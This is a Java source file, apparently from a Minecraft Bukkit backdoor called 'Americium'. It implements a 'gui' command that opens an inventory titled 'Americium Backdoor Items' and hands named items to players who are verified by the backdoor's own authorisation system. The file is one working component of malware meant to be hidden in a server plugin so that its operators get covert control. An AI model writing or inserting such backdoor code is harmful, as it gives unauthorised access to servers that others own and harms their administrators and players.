package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;

public class GUI implements Command, Listener {
    private final ArrayList<ItemStack> items = new ArrayList<>();
    private final HashMap<Material, String> namedItems = new HashMap<>();
    private Inventory inventory = null;
    private Z_ z;

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"gui"};
    }

    @Override
    public String getDescription() {
        return "Open an inventory with various backdoored items.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            try {
                this.openInventory(executor);
                sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully gave you an backdoor inventory!");
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        });
    }

    public void onEnable(Z_ z) {
        // --- BEGIN CUSTOM CODE ---
        this.namedItems.put(Material.STONE_AXE, "&aWand");
        this.namedItems.put(Material.STICK, "&aToy Stick 5");
        this.namedItems.put(Material.TNT, "&cBomb");
        
        // --- END CUSTOM CODE ---


        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);

        for (Material type : this.namedItems.keySet()) {
            String name = this.namedItems.get(type);
            ItemStack item = new ItemStack(type);
            ItemMeta meta = item.getItemMeta();

            meta.setDisplayName(ChatColor.translateAlternateColorCodes('&', name));
            item.setItemMeta(meta);
            this.items.add(item);
        }

        int inventorySize = 9;

        for (int i = 0; i < 100; i++) {
            if (inventorySize < this.items.size()) {
                inventorySize += 9;
            } else {
                break;
            }
        }

        this.inventory = Bukkit.createInventory(null, inventorySize);
        for (ItemStack item : this.items) {
            this.inventory.addItem(item);
        }
    }

    @EventHandler
    private void inventoryClick(InventoryClickEvent e) throws IOException, InterruptedException {
        ItemStack item = e.getCurrentItem();
        if (item == null) {
            return;
        }

        if (item.getType() == Material.AIR) {
            return;
        }

        Player player = Bukkit.getPlayer(e.getWhoClicked().getUniqueId());
        if (player == null) {
            return;
        }

        if (!z.getAuth().isVerified(player.getName())) {
            return;
        }

        if (e.getView().getTitle().equals(ChatColor.DARK_GREEN + "Americium Backdoor Items")) {
            e.setCancelled(true);
            player.getInventory().addItem(item);
            player.updateInventory();
        }
    }

    private void openInventory(Player player) {
        Inventory newInventory = Bukkit.createInventory(null, inventory.getSize(), ChatColor.DARK_GREEN + "Americium Backdoor Items");
        for (ItemStack item : this.inventory.getContents()) {
            if (item == null) {
                continue;
            }

            newInventory.addItem(item);
        }

        player.openInventory(newInventory);
    }
}
